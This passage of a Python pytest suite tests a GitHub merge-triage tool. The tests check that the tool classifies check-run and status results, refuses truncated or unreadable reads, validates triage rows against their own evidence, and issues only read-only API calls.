    the red — a surface that reads GREEN where the rail reads RED.
    """
    older_red = {"id": 1, "name": "", "status": "completed",
                 "conclusion": "failure", "app": {"slug": "github-actions"},
                 "started_at": "2026-09-27T09:00:00Z",
                 "completed_at": "2026-09-27T09:05:00Z"}
    newer_green = {"id": 2, "name": "", "status": "completed",
                   "conclusion": "success", "app": {"slug": "github-actions"},
                   "started_at": "2026-09-27T10:00:00Z",
                   "completed_at": "2026-09-27T10:05:00Z"}
    verdict, _anchor, reds, _pending = mt.classify_surface_runs(
        [older_red, newer_green])
    assert verdict == mt.SURFACE_RED
    assert reds == [(mt.UNNAMED_CHECK, "2026-09-27T09:00:00Z")]
    # A single unnamed run is classified too, never dropped.
    assert mt.classify_surface_runs([older_red])[0] == mt.SURFACE_RED


def test_surface_probe_reads_the_legacy_status_half():
    """The rail probes TWO endpoints; a red on the status half is a red."""
    def status(context, state, stamp="2026-09-27T10:00:00Z"):
        return {"context": context, "state": state, "updated_at": stamp}

    verdict, _anchor, reds, _pending = mt.classify_surface_runs(
        [_cr(1, "test (a)", "success")], [status("legacy", "failure")])
    assert verdict == mt.SURFACE_RED
    assert reds == [("legacy", "2026-09-27T10:00:00Z")]
    # An UNNAMED status state is classified, never dropped (#1353).
    assert mt.classify_surface_runs([], [status("", "mystery")])[0] == \
        mt.SURFACE_RED


def test_surface_probe_status_pending_is_not_a_measurement():
    """`pending` is never red AND must not advance the anchor (#1353).

    The combined-status body reports aggregate `pending` for a body carrying
    ZERO statuses, and a pending status's `updated_at` is when it was queued,
    not when anything was measured. Letting it stamp the anchor moved the
    last-production time FORWARD past the real evaluation, so a base red that
    began in between compared as already-measured.
    """
    pending = {"context": "legacy", "state": "pending",
               "updated_at": "2026-09-27T12:00:00Z"}
    measured = {"context": "measured", "state": "success",
                "updated_at": "2026-09-27T09:00:00Z"}
    verdict, anchor, reds, pending_n = mt.classify_surface_runs(
        [], [pending, measured])
    assert verdict == mt.SURFACE_PENDING
    assert reds == [] and pending_n == 1
    assert anchor == "2026-09-27T09:00:00Z"


def test_surface_probe_refuses_a_truncated_enumeration(monkeypatch):
    """A TRUNCATED page is a failure to look, not a clean surface.

    `total_count` is the enumeration's own claim about how many check runs
    exist; a short list against it is a partial read. Task 1's
    `_check_main_gate` fails closed on exactly this, and a partial read here
    would report GREEN/`eligible` for a PR whose red sits on an unread page.
    """
    runs = [_cr(1, "test (a)", "success")]
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (runs, 3))
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: ([], 0))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    # A missing/None total is unreadable, never "assume complete".
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (runs, None))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    # POSITIVE CONTROL: an agreeing total still reads the surface.
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (runs, 1))
    assert mt.surface_probe("a" * 40)[0] == mt.SURFACE_GREEN


def test_surface_probe_refuses_a_partial_surface(monkeypatch):
    """ONE unread endpoint is a PARTIAL surface, which the rail refuses.

    The rail fetches `/check-runs` and `/status` independently and refuses when
    either could not be read, because the half it could not read is exactly
    where a red would hide (#1261). Returning the readable half as a verdict is
    the fail-open that disarmed §4.6/§4.7.
    """
    runs = [_cr(1, "test (a)", "success")]
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (runs, 1))
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: (mt.UNKNOWN, mt.UNKNOWN))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (mt.UNKNOWN, mt.UNKNOWN))
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: ([], 0))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    # BOTH unreadable is UNREADABLE (also a refusal, never GREEN).
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: (mt.UNKNOWN, mt.UNKNOWN))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN


def test_newest_status_keeps_the_earlier_entry_on_a_tie_and_supersedes_later():
    """The legacy-status newest rule is `stamp > best`, STRICTLY.

    The rail keeps the entry it saw FIRST on an equal stamp, so a tie must not
    be resolved by list order: with `failure` first and `success` second at the
    SAME stamp, `>=` would let the green supersede the red and the status half
    would read GREEN. A LATER stamp legitimately supersedes.
    """
    def status(state, stamp):
        return {"context": "legacy", "state": state, "updated_at": stamp}

    tied = [status("failure", "2026-09-27T10:00:00Z"),
            status("success", "2026-09-27T10:00:00Z")]
    verdict, _anchor, reds, _pending = mt.classify_surface_runs([], tied)
    assert verdict == mt.SURFACE_RED
    assert reds == [("legacy", "2026-09-27T10:00:00Z")]
    later = [status("failure", "2026-09-27T09:00:00Z"),
             status("success", "2026-09-27T10:00:00Z")]
    assert mt.classify_surface_runs([], later)[0] == mt.SURFACE_GREEN


def test_surface_probe_refuses_a_truncated_status_enumeration(monkeypatch):
    """The status half is reconciled against its own total too."""
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: ([], 0))
    monkeypatch.setattr(mt, "fetch_statuses",
                        lambda sha: ([{"context": "c", "state": "success"}], 5))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    # A MISSING/non-numeric status total is unreadable, exactly as it is on the
    # check-run half — the two endpoints are reconciled by the same rule.
    monkeypatch.setattr(mt, "fetch_statuses",
                        lambda sha: ([{"context": "c", "state": "success"}],
                                     None))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN
    monkeypatch.setattr(mt, "fetch_statuses",
                        lambda sha: ([{"context": "c", "state": "success"}],
                                     True))
    assert mt.surface_probe("a" * 40)[0] == mt.UNKNOWN


def test_fetch_statuses_reports_an_unreadable_body(monkeypatch):
    """The reader that decides whether the consumer ever sees UNKNOWN.

    A `_gh_api` failure returns the string sentinel, so the first two cases are
    one guard, not two: any non-dict body is UNKNOWN. The distinction that
    matters is the LAST pair — an EMPTY status list is a successful read of a
    surface with no statuses, not an unreadable endpoint.
    """
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: mt.UNKNOWN)
    assert mt.fetch_statuses("a" * 40) == (mt.UNKNOWN, mt.UNKNOWN)
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: "not-a-dict")
    assert mt.fetch_statuses("a" * 40) == (mt.UNKNOWN, mt.UNKNOWN)
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: {"statuses": "x"})
    assert mt.fetch_statuses("a" * 40) == (mt.UNKNOWN, mt.UNKNOWN)
    monkeypatch.setattr(mt, "_gh_api",
                        lambda *a, **k: {"statuses": [], "total_count": 0})
    assert mt.fetch_statuses("a" * 40) == ([], 0)
    one = [{"context": "c", "state": "success"}]
    monkeypatch.setattr(mt, "_gh_api",
                        lambda *a, **k: {"statuses": one, "total_count": 1})
    assert mt.fetch_statuses("a" * 40) == (one, 1)


def test_run_event_resolves_the_first_run_id_in_the_url(monkeypatch):
    """`_run_event` resolves the FIRST `/runs/<N>` in the url.

    The id is a RUN id, so only digits may be taken from it: a URL whose
    segment is not all digits resolves to nothing, which BLOCKS rather than
    resolving some other endpoint.
    """
    seen = []

    def fake_api(path, *a, **k):
        seen.append(path)
        return {"event": "salvage"}

    monkeypatch.setattr(mt, "_gh_api", fake_api)
    assert mt._run_event(
        "https://github.com/o/r/actions/runs/111/job/2?x=/runs/222") == \
        "salvage"
    assert seen == [f"repos/{mt.OWNER_REPO}/actions/runs/111"]
    # A non-numeric segment is NOT a run id — no call is made at all.
    seen.clear()
    assert mt._run_event("https://github.com/o/r/actions/runs/abc") == \
        mt.UNKNOWN
    assert seen == []
    # A URL with no run id is UNKNOWN, and UNKNOWN blocks.
    assert mt._run_event("https://example.com/job/2") == mt.UNKNOWN
    assert mt._run_event("") == mt.UNKNOWN
    assert seen == []


def test_stale_by_clock_refuses_a_red_that_started_after_the_anchor():
    clock = [(mt._parse_ts("2026-09-27T10:45:26Z"), "test (b)",
              "2026-09-27T10:45:26Z")]
    assert mt._stale_by_clock("2026-09-27T09:15:12Z", clock) == (
        True, "test (b)", "2026-09-27T10:45:26Z")
    assert mt._stale_by_clock("2026-09-27T11:00:00Z", clock) == (
        False, None, None)


def test_stale_by_clock_refuses_on_an_unreadable_red_start():
    clock = [(None, "test (b)", "not-a-time")]
    assert mt._stale_by_clock("2026-09-27T11:00:00Z", clock)[0] is True


def test_stale_by_clock_refuses_when_the_surface_has_no_anchor():
    clock = [(mt._parse_ts("2026-09-27T10:45:26Z"), "test (b)",
              "2026-09-27T10:45:26Z")]
    assert mt._stale_by_clock(None, clock)[0] is True
    # §4.6 is RED-RELATIVE: a GREEN base is a POSITIVE "nothing to measure".
    assert mt._stale_by_clock(None, []) == (False, None, None)


@pytest.mark.parametrize("verdict,stale,evidence", [
    (mt.SURFACE_GREEN, False, FRESH_EVIDENCE),
    (mt.SURFACE_GREEN, True, STALE_EVIDENCE),
    (mt.SURFACE_GREEN, True, MERGE_REF_EVIDENCE),
    (mt.SURFACE_RED, False, RED_EVIDENCE),
    (mt.SURFACE_PENDING, False, PENDING_EVIDENCE),
])
def test_surface_evidence_round_trips(verdict, stale, evidence):
    assert mt.surface_from_evidence(evidence) == (verdict, stale)


@pytest.mark.parametrize("bad", [
    "", "   ", "GREEN", "verdict=MAYBE; stale=0",
    "verdict=GREEN", "verdict=GREEN; stale=maybe",
    "verdict=GREEN; stale=0",                  # no production time
    "verdict=GREEN; stale=1",                  # names WHAT it failed to measure
    "verdict=GREEN; produced=x",               # no stale verdict at all
    "verdict=GREEN; stale=0; produced=x; verdict=RED",   # duplicate keys
])
def test_surface_evidence_hand_written_forms_are_unknown(bad):
    assert mt.surface_from_evidence(bad) == (mt.UNKNOWN, mt.UNKNOWN)


def test_collect_triage_stale_surface_refuses_a_failed_surface(monkeypatch):
    """An unreadable surface must refuse the read, never pass as fresh."""
    prs = [{"number": 1, "head": {"sha": "a" * 40}}]
    monkeypatch.setattr(mt, "surface_probe",
                        lambda sha: (mt.UNKNOWN, None, [], 0))
    assert mt.collect_triage_stale_surface(
        prs, base=("b" * 40, [("test (b)", "2026-09-27T10:45:26Z")])) is None


def test_surface_evidence_round_trips_an_unreadable_base_red_start():
    """§4.6's UNREADABLE-TIME arm must round-trip its own evidence.

    A base red whose `started_at` cannot be parsed makes §4.6 refuse with no
    timestamp to cite. If the producer then emitted `stale=1` with neither a
    timestamp nor a marker, the parser (rightly) called it UNKNOWN, validation
    rejected the WHOLE read, and the documented `re_measure` row was
    unreachable — one unreadable start hard-failed the sweep. The arm is named
    explicitly instead.
    """
    evidence = mt.build_surface_evidence(
        mt.SURFACE_GREEN, produced="2026-09-27T09:00:00Z", stale=True,
        base_red_started=None, red="test (b)")
    assert "base_red_unreadable=1" in evidence
    assert mt.surface_from_evidence(evidence) == (mt.SURFACE_GREEN, True)
    # And the row it produces is the stale-green class, not `eligible`.
    assert mt._surface_bucket(*mt.surface_from_evidence(evidence)) == \
        "re_measure"
    # A timestamped red still cites the timestamp, not the marker.
    timed = mt.build_surface_evidence(
        mt.SURFACE_GREEN, produced="2026-09-27T09:00:00Z", stale=True,
        base_red_started="2026-09-27T10:45:26Z", red="test (b)")
    assert "base_red_unreadable" not in timed
    assert mt.surface_from_evidence(timed) == (mt.SURFACE_GREEN, True)


def test_collect_triage_stale_surface_47_unreadable_parent_refuses(monkeypatch):
    """§4.7 on a RED base FAILS CLOSED when the parent cannot be read.

    With the base red and §4.6 not firing, §4.7 is the sweep's remaining
    certification that the green was measured against the tree the merge will
    produce. The rail refuses an unreadable parent ("I did not look is never a
    green"); falling through would emit `verdict=GREEN; stale=0` — the rail's
    ACCEPT class — for a PR the rail blocks.
    """
    prs = [{"number": 1, "head": {"sha": "a" * 40}}]
    monkeypatch.setattr(mt, "surface_probe",
                        lambda sha: (mt.SURFACE_GREEN, "2026-09-27T11:00:00Z",
                                     [], 0))
    monkeypatch.setattr(mt, "merge_ref_base_parent", lambda pr: mt.UNKNOWN)
    assert mt.collect_triage_stale_surface(
        prs, base=("b" * 40, [("test (b)", "2026-09-27T10:45:26Z")])) is None
    # POSITIVE CONTROL: a READABLE parent that matches the base head still
    # certifies the green as fresh — the refusal is about the read, not the
    # base being red.
    monkeypatch.setattr(mt, "merge_ref_base_parent", lambda pr: "b" * 40)
    fresh = ("verdict=GREEN; stale=0; produced=2026-09-27T11:00:00Z")
    assert mt.collect_triage_stale_surface(
        prs, base=("b" * 40,
                   [("test (b)", "2026-09-27T10:45:26Z")])) == {1: fresh}
    # A GREEN base never consults §4.7 at all, so an unreadable parent there is
    # not a refusal — there is nothing a green base could have failed to
    # measure.
    monkeypatch.setattr(mt, "merge_ref_base_parent", lambda pr: mt.UNKNOWN)
    assert mt.collect_triage_stale_surface(prs, base=("b" * 40, [])) == \
        {1: fresh}


def test_base_reds_exempt_a_non_code_event(monkeypatch):
    """A `schedule`/`issues` red does not enter §4.6's BASE clock.

    The rail probes the base with `allow_noncode=1`: such a run measures no
    revision, and blocking on it would refuse every merge whenever the cron
    lanes are red. An UNRESOLVED event still blocks — the exemption is decided
    by the surface, never granted by default.
    """
    runs = [_cr(1, "cron-lane", "failure",
                html_url="https://github.com/o/r/actions/runs/11/job/1"),
            _cr(2, "test (b)", "failure",
                html_url="https://github.com/o/r/actions/runs/22/job/1")]
    events = {11: "schedule", 22: "pull_request"}

    def fake_api(path, *a, **k):
        if path.endswith("/commits/main"):
            return {"sha": "c" * 40}
        match = re.search(r"/actions/runs/(\d+)$", path)
        if match:
            return {"event": events.get(int(match.group(1)), "")}
        return mt.UNKNOWN

    monkeypatch.setattr(mt, "_gh_api", fake_api)
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: (runs, 2))
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: ([], 0))
    assert mt.base_blocking_reds() == (
        "c" * 40, [("test (b)", "2026-09-27T10:00:00Z")])
    # AN UNRESOLVED EVENT BLOCKS: defaulting to exempt would be a fail-open.
    events = {}
    assert mt.base_blocking_reds() == (
        "c" * 40,
        [("cron-lane", "2026-09-27T10:00:00Z"),
         ("test (b)", "2026-09-27T10:00:00Z")])


def test_base_reds_never_run_resolve_a_legacy_commit_status(monkeypatch):
    """A status red's `target_url` must not inherit an exempting event.

    A commit status's URL is the app's OWN arbitrary link: a `/runs/<N>` inside
    it names SOME run, not the run that produced the row, and a status has no
    triggering Actions event at all. The rail clears the run id for a
    `commit-status` app so such a red stays code-measuring and blocks (#1446).
    """
    statuses = [{"context": "legacy", "state": "failure",
                 "updated_at": "2026-09-27T10:00:00Z",
                 "target_url": "https://github.com/o/r/actions/runs/11"}]

    def fake_api(path, *a, **k):
        if path.endswith("/commits/main"):
            return {"sha": "c" * 40}
        return {"event": "schedule"}

    monkeypatch.setattr(mt, "_gh_api", fake_api)
    monkeypatch.setattr(mt, "fetch_check_runs", lambda sha: ([], 0))
    monkeypatch.setattr(mt, "fetch_statuses", lambda sha: (statuses, 1))
    assert mt.base_blocking_reds() == (
        "c" * 40, [("legacy", "2026-09-27T10:00:00Z")])


def test_no_languish_refuses_a_bucket_label_hidden_in_classification():
    """A bucket word in the LEGACY column is a bucket claim, and is checked.

    `_excluded` reads EITHER classification column, so both are exclusion
    channels. A row declaring `classification:"draft"` with `draft:false`
    excluded a moveless PR while the same row written with `bucket` was
    refused. The legacy column's OWN vocabulary (`open`) is not a bucket and
    has nothing to re-derive against, so it is left alone.
    """
    hidden = [{"number": i, "classification": "draft", "draft": False,
               "conflict": False, "moved_in_window": False}
              for i in range(12)]
    assert run_check(
        "no-languish",
        json={"items": hidden, "total_count": 12, "read_ok": True,
              "window_days": 7},
        require_complete=True) == 2
    # The legacy `open` vocabulary is untouched — it is not a bucket word.
    legacy = [{"number": i, "classification": "open",
               "moved_in_window": False} for i in range(12)]
    assert run_check(
        "no-languish",
        json={"items": legacy, "total_count": 12, "read_ok": True,
              "window_days": 7},
        require_complete=True) == 1


def test_collect_triage_stale_surface_green_base_is_fresh(monkeypatch):
    prs = [{"number": 1, "head": {"sha": "a" * 40}}]
    monkeypatch.setattr(mt, "surface_probe",
                        lambda sha: (mt.SURFACE_GREEN, "2026-09-27T00:00:00Z",
                                     [], 0))
    out = mt.collect_triage_stale_surface(prs, base=("b" * 40, []))
    assert out == {1: FRESH_EVIDENCE}


def test_collect_triage_stale_surface_46_fires_and_skips_47(monkeypatch):
    """§4.6 already refused, so §4.7's extra call must not be spent."""
    prs = [{"number": 1, "head": {"sha": "a" * 40},
            "merge_commit_sha": "c" * 40}]
    monkeypatch.setattr(mt, "surface_probe",
                        lambda sha: (mt.SURFACE_GREEN, "2026-09-25T00:00:00Z",
                                     [], 0))
    called = []
    monkeypatch.setattr(mt, "merge_ref_base_parent",
                        lambda pr: called.append(pr["number"]) or mt.UNKNOWN)
    out = mt.collect_triage_stale_surface(
        prs, base=("b" * 40, [("test (b)", "2026-09-27T10:45:26Z")]))
    assert out[1] == STALE_EVIDENCE
    assert called == []


def test_collect_triage_stale_surface_47_catches_a_lagging_merge_ref(monkeypatch):
    """A green produced AFTER the red, but evaluated against an OLDER base:
    §4.6's ordering rule cannot see it, so §4.7's parent comparison must."""
    prs = [{"number": 1, "head": {"sha": "a" * 40},
            "merge_commit_sha": "c" * 40}]
    monkeypatch.setattr(mt, "surface_probe",
                        lambda sha: (mt.SURFACE_GREEN, "2026-09-27T11:00:00Z",
                                     [], 0))
    monkeypatch.setattr(mt, "merge_ref_base_parent", lambda pr: "f" * 40)
    out = mt.collect_triage_stale_surface(
        prs, base=("b" * 40, [("test (b)", "2026-09-27T10:45:26Z")]))
    assert out[1] == ("verdict=GREEN; stale=1; produced=2026-09-27T11:00:00Z; "
                      "merge_ref_base=" + "f" * 40 + "; base_head="
                      + "b" * 40)


def test_collect_triage_stale_surface_records_a_red_surface(monkeypatch):
    prs = [{"number": 1, "head": {"sha": "a" * 40}}]
    monkeypatch.setattr(mt, "surface_probe", lambda sha: (
        mt.SURFACE_RED, "2026-09-27T09:00:00Z",
        [("python-ci-gate", "2026-09-27T08:00:00Z")], 0))
    out = mt.collect_triage_stale_surface(prs, base=("b" * 40, []))
    assert out[1] == RED_EVIDENCE


def test_triage_rows_carry_both_new_surface_buckets(monkeypatch):
    prs = [{"number": 1, "draft": False, "title": "a (#10)",
            "head": {"ref": "fix/10-a"}},
           {"number": 2, "draft": False, "title": "b (#11)",
            "head": {"ref": "fix/11-b"}}]
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: prs)
    monkeypatch.setattr(mt, "collect_triage_conflicts",
                        lambda *a, **k: {1: (False, []), 2: (False, [])})
    monkeypatch.setattr(mt, "collect_triage_stale_surface",
                        lambda *a, **k: {1: STALE_EVIDENCE, 2: RED_EVIDENCE})
    monkeypatch.setattr(mt, "open_pr_total", lambda: 2)
    monkeypatch.setattr(mt, "load_triage_owner_evidence", lambda *a, **k: {})
    rows, total = mt._triage_rows()
    assert total == 2
    assert [r["bucket"] for r in rows] == ["re_measure", "blocked"]
    assert rows[0]["eligible"] is False and rows[1]["eligible"] is False
    assert mt.validate_triage_rows(rows, total_count=2, min_population=1) == []


def test_validate_rejects_a_bucket_that_disagrees_with_its_evidence():
    """A bucket is re-derived from the row's OWN evidence, not trusted."""
    row = _row(_pr(9999), conflict=False)
    row["bucket"] = "re_measure"          # fresh evidence says otherwise
    row["eligible"] = False
    assert any("first match" in e for e in
               mt.validate_triage_rows([row], total_count=1, min_population=1))
    stale = _row(_pr(9999), conflict=False, surface=mt.SURFACE_GREEN,
                 stale=True, evidence=STALE_EVIDENCE)
    assert stale["bucket"] == "re_measure"
    assert mt.validate_triage_rows([stale], total_count=1,
                                   min_population=1) == []
    # A malformed evidence string cannot certify ANY surface-conditioned bucket.
    broken = _row(_pr(9999), conflict=False)
    broken["surface_evidence"] = "verdict=GREEN; stale=0"
    errors = mt.validate_triage_rows([broken], total_count=1, min_population=1)
    assert any("well-formed" in e for e in errors), errors


@pytest.mark.parametrize("draft,conflict", [
    (mt.UNKNOWN, False), (mt.UNKNOWN, True), (False, mt.UNKNOWN),
    (None, False), ("yes", False),
    # a non-bool CONFLICT must not fall through to `eligible` either
    (False, None), (False, "yes"), (False, 1), (False, 0), (False, {}),
])
def test_undecidable_inputs_are_never_eligible(draft, conflict):
    assert mt.classify_bucket(9999, draft=draft, conflict=conflict) == mt.UNKNOWN


def test_an_observed_draft_is_a_draft_even_with_an_unknown_conflict():
    # `draft` is OBSERVED True: it decides before the unprobed conflict does.
    assert mt.classify_bucket(9999, draft=True, conflict=mt.UNKNOWN) == "draft"


def test_dead_weight_requires_positive_evidence():
    # A PR whose work is not provably on main must NOT be placed in dead_weight.
    assert mt.classify_bucket(424242, draft=True, conflict=False) == "draft"
    assert mt.build_triage_row(_pr(424242, draft=True), conflict=False)[
        "superseded_by"] == mt.UNKNOWN


def test_validate_rejects_an_unsupported_dead_weight_and_a_lying_boolean():
    # A dead_weight bucket with no superseded_by evidence is not a disposition.
    row = mt.build_triage_row(_pr(5453, draft=True), conflict=True)
    row["superseded_by"] = mt.UNKNOWN
    assert any("no superseded_by evidence" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))
    # A boolean column that disagrees with its own source set is a lie.
    row = mt.build_triage_row(_pr(9999), conflict=False)
    row["hard_stop"] = True
    assert any("hard_stop disagrees" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))
    row = mt.build_triage_row(_pr(9999), conflict=False)
    row["terminal_decision"] = True
    assert any("terminal_decision disagrees" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))


def test_validate_rejects_an_unlabelled_or_unsupported_owner():
    row = mt.build_triage_row(_pr(), conflict=False, owner=None,
                              owner_evidence="branch=x")
    assert any("neither UNKNOWN nor a label" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))
    # A resolved owner must carry the session+branch+first-message evidence.
    row = mt.build_triage_row(_pr(), conflict=False, owner="session:abc",
                              owner_evidence="")
    assert any("carries no owner_evidence" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))
    row = mt.build_triage_row(_pr(), conflict=False, owner="session:abc",
                              owner_evidence="a lane asserted it")
    assert any("missing 'branch='" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))
    row = mt.build_triage_row(_pr(), conflict=False, owner="session:abc",
                              owner_evidence="branch=x; session=; first_msg=y")
    assert any("missing 'session='" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))


def test_validate_rejects_a_null_owner_from_a_null_evidence_field(monkeypatch):
    # A JSON `null` owner must normalise to UNKNOWN, never survive as `None`.
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: [
        {"number": 1, "draft": False, "title": "a (#2)",
         "head": {"ref": "fix/2-a"}}])
    monkeypatch.setattr(mt, "collect_triage_conflicts",
                        lambda *a, **k: {1: (False, [])})
    monkeypatch.setattr(mt, "collect_triage_stale_surface",
                        lambda *a, **k: {1: FRESH_EVIDENCE})
    monkeypatch.setattr(mt, "open_pr_total", lambda: 1)
    monkeypatch.setattr(mt, "load_triage_owner_evidence",
                        lambda *a, **k: {1: {"owner": None,
                                             "owner_evidence": None}})
    rows, _total = mt._triage_rows()
    assert rows[0]["owner"] == mt.UNKNOWN
    assert rows[0]["owner_evidence"] == mt.UNKNOWN


def test_validate_rejects_an_unknown_bucket_as_non_clean():
    row = mt.build_triage_row(_pr(), conflict=mt.UNKNOWN)
    errors = mt.validate_triage_rows([row], total_count=1, min_population=1)
    assert any("is not one of the buckets" in e for e in errors), errors
def test_validate_rejects_a_bucket_that_is_not_the_first_match():
    row = mt.build_triage_row(_pr(9999), conflict=True)
    row["bucket"] = "eligible"          # a lie about a conflicted PR
    row["eligible"] = True
    errors = mt.validate_triage_rows([row], total_count=1, min_population=1)
    assert any("first match" in e for e in errors), errors


def test_validate_rejects_missing_and_extra_schema_keys():
    row = mt.build_triage_row(_pr(), conflict=False)
    missing = {k: v for k, v in row.items() if k != "owner_evidence"}
    assert any("schema keys differ" in e
               for e in mt.validate_triage_rows([missing], min_population=1))
    extra = {**row, "surprise": 1}
    assert any("schema keys differ" in e
               for e in mt.validate_triage_rows([extra], min_population=1))


def test_validate_rejects_owner_equal_to_the_shared_author_login():
    row = mt.build_triage_row(_pr(), conflict=False,
                              owner=mt.FLEET_AUTHOR_LOGIN,
                              owner_evidence="author=@me")
    errors = mt.validate_triage_rows([row], total_count=1, min_population=1)
    assert any("shared PR-author login" in e for e in errors), errors


def test_validate_accepts_a_session_owner_and_independent_booleans():
    row = _row(
        _pr(5136, draft=True), conflict=True, conflicted_paths=["a.txt"],
        owner="session:0123456789ab",
        owner_evidence="branch=fix/20-h; session=0123456789ab; first_msg=...")
    assert mt.validate_triage_rows([row], total_count=1, min_population=1) == []
    assert row["draft"] is True and row["hard_stop"] is True


def test_validate_reconciles_counts_and_enforces_the_population_floor():
    rows = [_row(_pr(), conflict=False)]
    assert any("reconcile" in e
               for e in mt.validate_triage_rows(rows, total_count=5,
                                                min_population=1))
    assert any("floor" in e
               for e in mt.validate_triage_rows(rows, total_count=1))
    assert mt.validate_triage_rows(rows, total_count=1, min_population=1) == []


def test_validate_rejects_non_boolean_columns():
    row = mt.build_triage_row(_pr(), conflict=False)
    row["draft"] = "false"
    errors = mt.validate_triage_rows([row], total_count=1, min_population=1)
    assert any("draft is not boolean" in e for e in errors), errors


def test_triage_issues_no_mutating_request(monkeypatch):
    """`--triage` must issue no mutating request (mocked transport)."""
    prs = [{"number": i, "draft": False, "title": f"x (#{i})",
            "head": {"ref": f"fix/{i}-x"}} for i in range(1, 13)]
    gh_calls = []
    real_run = mt.subprocess.run

    def fake_run(cmd, **kwargs):
        if isinstance(cmd, (list, tuple)) and len(cmd) >= 2 and cmd[0] == "gh":
            gh_calls.append(list(cmd))
            return SimpleNamespace(returncode=0,
                                   stdout=_json.dumps([prs]), stderr="")
        return real_run(cmd, **kwargs)

    monkeypatch.setattr(mt.subprocess, "run", fake_run)
    monkeypatch.setattr(mt, "collect_triage_conflicts", lambda *a, **k: {})
    monkeypatch.setattr(mt, "collect_triage_stale_surface",
                        lambda *a, **k: {i: FRESH_EVIDENCE for i in range(1, 13)})
    monkeypatch.setattr(mt, "open_pr_total", lambda: 12)
    monkeypatch.setattr(mt, "load_triage_owner_evidence", lambda *a, **k: {})
    rows, total = mt._triage_rows()
    assert len(rows) == 12 and total == 12
    assert gh_calls, "the enumeration must go through gh"
    mutating = ("-X", "--method", "-f", "--field", "--raw-field", "--input",
                "POST", "PATCH", "PUT", "DELETE")
    for call in gh_calls:
        assert call[0] == "gh" and call[1] == "api", call
        assert not any(token in call for token in mutating), call
        assert any("pulls?state=open" in part for part in call), call


def test_triage_refuses_a_failed_conflict_sweep(monkeypatch):
    """A FAILED conflict sweep must refuse the whole read, not read as empty."""
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: [{"number": 1, "draft": False}])
    monkeypatch.setattr(mt, "collect_triage_conflicts", lambda *a, **k: None)
    assert mt._triage_rows() == (None, 0)


def test_triage_enumeration_failure_is_none(monkeypatch):
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: mt.UNKNOWN)
    assert mt._triage_rows() == (None, 0)
    assert mt.collect_triage_conflicts() is None


def test_triage_refuses_a_truncated_enumeration(monkeypatch):
    """A partial page that reconciles only against ITSELF is a silent truncation.

    The independent total is read AFTER the surface sweep, so the surface must
    be stubbed out here — otherwise `_triage_rows` refuses at the surface gate
    and this test passes without ever reaching the reconciliation it names.
    """
    prs = [{"number": i, "draft": False} for i in range(5)]
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: prs)
    monkeypatch.setattr(mt, "collect_triage_conflicts", lambda *a, **k: {})
    monkeypatch.setattr(mt, "load_triage_owner_evidence", lambda *a, **k: {})
    monkeypatch.setattr(
        mt, "collect_triage_stale_surface",
        lambda *a, **k: {p["number"]: FRESH_EVIDENCE for p in prs})
    # POSITIVE CONTROL: with a total that AGREES, the same read must succeed —
    # so the refusals below cannot be satisfied by an earlier gate.
    monkeypatch.setattr(mt, "open_pr_total", lambda: len(prs))
    rows, total = mt._triage_rows()
    assert rows is not None and total == len(prs)
    # The API says there are 9 open PRs; the enumeration returned 5.
    monkeypatch.setattr(mt, "open_pr_total", lambda: 9)
    assert mt._triage_rows() == (None, 0)
    # An unreadable independent total is UNKNOWN, never "assume complete".
    monkeypatch.setattr(mt, "open_pr_total", lambda: mt.UNKNOWN)
    assert mt._triage_rows() == (None, 0)


def test_validate_binds_dead_weight_evidence_to_the_verified_claim():
    row = _row(_pr(5190), conflict=False,
               dead_weight={5190: "#3405 (close_failed_at on main)"})
    assert mt.validate_triage_rows([row], total_count=1, min_population=1) == []
    row["superseded_by"] = "#9999 (a total lie)"
    assert any("does not match the verified evidence" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))


def test_validate_rejects_a_blank_conflicted_path():
    row = mt.build_triage_row(_pr(), conflict=True, conflicted_paths=[""])
    assert any("non-empty strings" in e
               for e in mt.validate_triage_rows([row], total_count=1,
                                                min_population=1))


def test_validate_rejects_a_bogus_session_owner():
    for bogus in ("session:totally-bogus", "session:branch", "session:",
                  "session:session"):
        row = mt.build_triage_row(
            _pr(), conflict=False, owner=bogus,
            owner_evidence="branch=branch; session=0123456789abcdef; first_msg=m")
        assert any("owner is not the session cited" in e
                   for e in mt.validate_triage_rows([row], total_count=1,
                                                    min_population=1)), bogus


def test_no_languish_bucket_and_classification_must_agree():
    """A second classification column must not be a second hiding channel."""
